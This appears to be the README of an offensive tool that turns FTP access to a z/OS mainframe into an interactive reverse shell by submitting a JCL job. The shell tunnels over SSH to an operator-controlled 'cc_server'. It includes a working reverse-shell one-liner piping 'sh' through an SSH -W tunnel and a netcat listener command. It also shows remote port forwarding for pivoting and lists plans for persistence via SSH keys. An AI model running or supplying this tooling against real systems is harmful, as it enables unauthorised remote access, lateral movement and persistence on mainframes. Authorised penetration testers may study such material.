# zos-pivoting

Library set to get a secure reverse shell by submitting a JCL job via FTP on z/OS.

```
$ python ftp2shell.py config.ini
Input the password for zuser on target.mainframe.net:

Save the pulic key below in ~ccserveraccount/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+og7UDXjtluvauvB3Uo7eFqYGTDYlptkdCIcUPNlakHbaZDTsXl/7xRPrbfuan+NLltHzmeYXm8JWSqDGsP+cyA2iRlu3hri8OhYtJtd8Sv/brEkg0ePc2X7U6l1/Qoaj8HWtS7wxXXKuCvChf3z/G7etSFOhiV7cp02JJTvK9dX5baAzw2DCqfh5LSRPlE7QbLqigYlI6bXxUfJ1TX5FdNSKdnBc7zL1umBT70+T/p5kZ/jDexGVsvdGtmgv1jrbONFGQuDz38GuvqyK5TNMw1EJBa/RxCXzRFKMdlfUWGeQQweoYNcDkftfAr84NRX8edXuh1mgyDOcIaCtj5Zl

Press Enter to continue...
mf.bigiron.local> uname
OS/390
mf.bigiron.local> exit
This will terminate the connection to mf.bigiron.local, are you sure? (y/N) y
```

The library contains:

 * `config.ini` a sample configuration file
 * `ftp2shell.py` the main script, it uses the config file and the next items
 * `reverseshellmanager.py` uses `stdiotranscoder.py` in zosutils to get a nice interactive shell via netcat or other
 * `zosutils/stdiotranscoder.py` wraps the stdin/stdout of a command and performs transparent re-encoding (EBCDIC to UTF8 or other encodings supported by python). In other words: makes nc/ncat support EBCDIC and other character encoding systems
 * `zosutils/zosftp.py` talks FTP and uses the extra features of the FTP server in z/OS
 * `sshutils/ssh_utils.py` generation and management of ssh keys and fingerprinting

The python files in the root of the project exhibit a lower coding quality than the others.

## Design
This project uses the new ssh stdin and stout redirection to get a fully interactive reverse shell on a mainframe.

Here is an example:

```
ssh -i $KEYNAME $CCU@$CCS -p $CCP -o UserKnownHostsFile=$KNOWNHOSTSFILE -o StrictHostKeyChecking=yes -N -W $NCIP:$NCP < $FIFONAME | sh -s > $FIFONAME 2>&1 & echo $STARTSEND > $FIFONAME'
```

SSH tunnels stdin and stdout, piping to a shell.
A FIFO file contains all the inputs and outputs to and from the shell.
Please note how awesome the strong host fingerprint checking and the key-based authentication are.

The same principle can be applied to other systems running ssh.

You have to do the cleanup by yourself.

Python >= 3.7 only.

## Requirements
You have to create a user in your machine to get the reverse connection on your `cc_server` (see the config file).
The user does not need an interactive shell.

## Dependencies
Python >= 3.7.

You can install the [ebcdic](https://pypi.org/project/ebcdic/) package to support more character encodings.

The default EBCDIC support in Python 3 should be enough most of the time.

## Usage:
 * Edit `config.ini`
 * Run `python ftp2shell.py config.ini`. The script will:
    - connect to the mainframe via FTP
    - generate and run a JCL batch
    - start a ssh connection against `cc_server` and start a tunneled clear-text shell
    - start the shell management
 * The resulting shell is a nearly full-featured SH shell.
The ssh tunnelling protects the shell.
 * There is a custom `_runssh` command which can be used to run further ssh commands.
Think port forwarding and that goodness.
For example, to get access to TN3270 on your localhost run:
```
mainframe> _runssh -R 2222:localhost:23
```
And then connect to localhost:2222.

## Testing
You can run the stdio wrapper and the reverse shell manager from the commandline.
There are also testing scripts.

### Example:
From a terminal run:
```
python reverseshellmanager.py cmd nc -l -p 1234
```
And on another one run:
```
bash testing/synch_shell.sh
```
Enjoy your local shell.

## Future Steps
* Update this readme
* Automate running custom sshd server on the target to get full socks proxy (-R)
* Automate the pivoting by parsing the output of netstat/NETSTAT and:
    - ssh -R
    - ssh -L
    - starting a local sshd
* Automatic APF library enumeration (?)
* Persistence via ssh keys (?)
* Port to other systems

